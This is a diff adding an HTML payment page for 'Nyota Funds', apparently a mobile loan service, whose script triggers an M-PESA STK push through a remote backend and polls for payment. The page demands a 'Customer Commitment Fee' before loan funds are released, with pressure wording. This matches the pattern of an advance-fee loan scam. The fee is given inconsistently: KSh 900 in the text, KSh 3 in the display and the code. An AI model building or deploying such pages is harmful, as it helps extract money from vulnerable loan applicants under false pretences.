@@ -1,1 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
 
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Customer Commitment Fee - Nyota Funds</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+    box-sizing:border-box;
+}
+
+body{
+    margin:0;
+    padding:16px 10px;
+    font-family:'Mali',sans-serif;
+    background:#0B0217;
+    color:#fff;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    margin:0 auto;
+}
+
+.card{
+    width:100%;
+    background:
+        linear-gradient(
+            145deg,
+            rgba(255,255,255,0.09),
+            rgba(255,255,255,0.035)
+        );
+    padding:22px 18px 18px;
+    border-radius:18px;
+    box-shadow:
+        0 20px 60px rgba(0,0,0,0.45),
+        inset 0 1px 0 rgba(255,255,255,0.05);
+    border:1px solid rgba(255,255,255,0.10);
+}
+
+h2{
+    color:#D4AF37;
+    font-size:22px;
+    font-weight:700;
+    text-align:center;
+    margin:2px 0 16px;
+}
+
+.success-box{
+    background:rgba(212,175,55,0.08);
+    color:rgba(255,255,255,0.78);
+    padding:14px 12px;
+    border-radius:12px;
+    font-size:14px;
+    line-height:1.5;
+    text-align:center;
+    margin-bottom:10px;
+    border:1px solid rgba(212,175,55,0.18);
+}
+
+.details{
+    background:rgba(255,255,255,0.045);
+    padding:15px;
+    border-radius:13px;
+    text-align:left;
+    font-size:14px;
+    border:1px solid rgba(255,255,255,0.10);
+    margin-bottom:15px;
+}
+
+.details p{
+    margin:9px 0;
+    line-height:1.45;
+}
+
+.details b{
+    color:rgba(255,255,255,0.88);
+}
+
+.details span{
+    color:#D4AF37;
+    font-weight:600;
+}
+
+button{
+    width:100%;
+    padding:15px;
+    margin-top:5px;
+    border:none;
+    border-radius:11px;
+    background:
+        linear-gradient(
+            135deg,
+            #D4AF37,
+            #A67C00
+        );
+    color:#0B0217;
+    font-size:16px;
+    font-weight:700;
+    font-family:'Mali',sans-serif;
+    cursor:pointer;
+    box-shadow:
+        0 10px 30px rgba(212,175,55,0.30);
+    transition:background .2s ease, transform .1s ease;
+}
+
+button:hover{
+    background:#A67C00;
+}
+
+button:active{
+    transform:scale(.98);
+}
+
+button:disabled{
+    background:rgba(255,255,255,0.25);
+    color:rgba(255,255,255,0.55);
+    cursor:not-allowed;
+    box-shadow:none;
+}
+
+#status{
+    min-height:20px;
+    margin-top:12px;
+    text-align:center;
+    font-size:13px;
+    line-height:1.4;
+    color:#D4AF37;
+}
+
+.secure{
+    margin:13px 0 0;
+    text-align:center;
+    font-size:12px;
+    color:rgba(255,255,255,0.40);
+}
+
+@media(max-width:360px){
+
+    body{
+        padding:10px 7px;
+    }
+
+    .card{
+        padding:18px 13px 15px;
+        border-radius:15px;
+    }
+
+    h2{
+        font-size:20px;
+    }
+
+    .details{
+        padding:12px;
+    }
+
+    button{
+        padding:14px;
+        font-size:15px;
+    }
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="card">
+
+<h2>Customer Commitment Fee</h2>
+
+<div class="success-box">
+
+To complete your NYOTA FUNDS application, a Customer Commitment Fee of KSh 900 is required at this final stage.
+
+This fee is required before your application can proceed to the next step. Once the payment is successfully confirmed, your application will continue for final processing and fund delivery.
+
+Please complete this payment to proceed. You are almost done with your application.
+
+</div>
+
+<div class="details">
+
+<p>
+<b>Applicant:</b>
+<span id="fullName">Loading...</span>
+</p>
+
+<p>
+<b>Phone:</b>
+<span id="phone">Loading...</span>
+</p>
+
+<p>
+<b>Selected Fund:</b>
+KSh <span id="fund">22,000</span>
+</p>
+
+<p>
+<b>Commitment Fee:</b>
+<span style="color:#1b5e20;font-weight:bold;">
+KSh 3
+</span>
+</p>
+
+</div>
+
+<button id="payBtn" onclick="payCommitment()">
+Pay Commitment Fee
+</button>
+
+<div id="status"></div>
+
+<p class="secure">
+🔒 Secure STK Push • Instant Confirmation
+</p>
+
+</div>
+
+</div>
+
+<script>
+
+// ==========================================
+// LOAD CUSTOMER DETAILS
+// ==========================================
+
+const fullName =
+localStorage.getItem("fullName");
+
+const phoneNumber =
+localStorage.getItem("phoneNumber");
+
+const selectedAmount =
+localStorage.getItem("selectedAmount");
+
+document.getElementById("fullName").textContent =
+fullName || "Applicant";
+
+document.getElementById("phone").textContent =
+phoneNumber || "Not available";
+
+document.getElementById("fund").textContent =
+selectedAmount || "22,000";
+
+
+// ==========================================
+// PAY COMMITMENT FEE
+// ==========================================
+
+async function payCommitment(){
+
+const phone =
+localStorage.getItem("phoneNumber");
+
+if(!phone){
+
+document.getElementById("status").innerHTML =
+"❌ Phone number not found. Please return to registration.";
+
+return;
+
+}
+
+const btn =
+document.getElementById("payBtn");
+
+const status =
+document.getElementById("status");
+
+btn.disabled = true;
+
+btn.innerHTML =
+"Sending STK Push...";
+
+status.innerHTML = "";
+
+try{
+
+const response = await fetch(
+"https://nyota-funds-backend.onrender.com/stk-push",
+{
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+
+phone:phone,
+
+amount:3
+
+})
+}
+);
+
+const data =
+await response.json();
+
+console.log("STK RESPONSE:",data);
+
+const checkoutId =
+data.checkout_request_id;
+
+if(!checkoutId){
+
+status.innerHTML =
+"❌ STK Push could not be initiated.";
+
+btn.disabled = false;
+
+btn.innerHTML =
+"Pay Commitment Fee";
+
+return;
+
+}
+
+status.innerHTML =
+"📱 STK Push sent successfully.<br>Please enter your M-PESA PIN.";
+
+checkPayment(checkoutId);
+
+}catch(error){
+
+console.error(error);
+
+status.innerHTML =
+"❌ Unable to send STK Push. Please try again.";
+
+btn.disabled = false;
+
+btn.innerHTML =
+"Pay Commitment Fee";
+
+}
+
+}
+
+
+// ==========================================
+// PAYMENT STATUS CHECK
+// ==========================================
+
+async function checkPayment(checkoutId){
+
+const interval =
+setInterval(async()=>{
+
+try{
+
+const response = await fetch(
+"https://nyota-funds-backend.onrender.com/payment-status",
+{
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+
+checkout_request_id:
+checkoutId
+
+})
+}
+);
+
+const result =
+await response.json();
+
+console.log("PAYMENT STATUS:",result);
+
+if(result.status === "completed"){
+
+clearInterval(interval);
+
+document.getElementById("status").innerHTML =
+"✅ Commitment fee paid successfully.<br>Redirecting...";
+
+setTimeout(()=>{
+
+window.location.href =
+"success.html";
+
+},1000);
+
+}
+
+else if(result.status === "failed"){
+
+clearInterval(interval);
+
+document.getElementById("status").innerHTML =
+"❌ Payment failed.";
+
+resetButton();
+
+}
+
+else if(result.status === "cancelled"){
+
+clearInterval(interval);
+
+document.getElementById("status").innerHTML =
+"❌ Payment cancelled.";
+
+resetButton();
+
+}
+
+}catch(error){
+
+console.error(
+"Payment status error:",
+error
+);
+
+}
+
+},3000);
+
+}
+
+
+// ==========================================
+// RESET BUTTON
+// ==========================================
+
+function resetButton(){
+
+const btn =
+document.getElementById("payBtn");
+
+btn.disabled = false;
+
+btn.innerHTML =
+"Pay Commitment Fee";
+
+}
+
+</script>
+
+</body>
+</html>
